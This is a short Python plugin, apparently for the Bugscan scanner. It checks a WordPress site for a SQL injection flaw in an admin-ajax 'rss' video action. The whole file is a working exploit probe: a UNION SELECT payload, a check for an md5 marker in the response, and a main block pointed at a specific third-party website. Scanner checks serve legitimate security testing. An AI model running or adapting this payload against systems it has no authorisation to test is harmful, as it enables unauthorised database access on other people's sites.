#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '半块西瓜皮'
# refer https://www.bugscan.net/#!/x/21247

def assign(service, arg):
    if service == "wordpress":
        return True, arg
def audit(args):
    payload = 'wp-admin/admin-ajax.php?action=rss&type=video&vid=11/**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,17,8,9,0,1,2,3,4,5,6,27,8,9,0,1,2,3,4,5,6,md5(521521),8,9%23'
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and '35fd19fbe470f0cb5581884fa700610f' in content:
        security_hole(verify_url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://taperanoticiavivo.com.br/')[1])
